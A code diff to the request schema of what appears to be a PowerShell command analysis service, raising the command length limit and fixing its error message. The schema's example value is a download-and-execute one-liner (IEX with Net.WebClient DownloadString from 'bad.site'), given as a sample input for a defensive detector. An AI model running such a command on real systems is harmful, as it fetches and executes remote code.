@@ -8,7 +8,7 @@ from datetime import datetime
 
 class AnalyzeCommandRequest(BaseModel):
     """Schema for PowerShell command analysis request"""
-    command: str = Field(..., description="PowerShell command to analyze", max_length=10000, example="IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")
+    command: str = Field(..., description="PowerShell command to analyze", max_length=100000, example="IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")
     user_id: Optional[str] = Field(None, description="User ID (if authenticated)")
     ip_address: Optional[str] = Field(None, description="Client IP address")
     user_agent: Optional[str] = Field(None, description="User agent string")
@@ -24,8 +24,8 @@ class AnalyzeCommandRequest(BaseModel):
     def validate_command_length(cls, v):
         if not v or not isinstance(v, str):
             raise ValueError("Command is required and must be a string")
-        if len(v) > 10000:
-            raise ValueError(f"Command exceeds maximum length of 5000 characters. Provided: {len(v)} characters")
+        if len(v) > 100000:
+            raise ValueError(f"Command exceeds maximum length of 100000 characters. Provided: {len(v)} characters")
         if len(v) == 0:
             raise ValueError("Command cannot be empty")
         return v
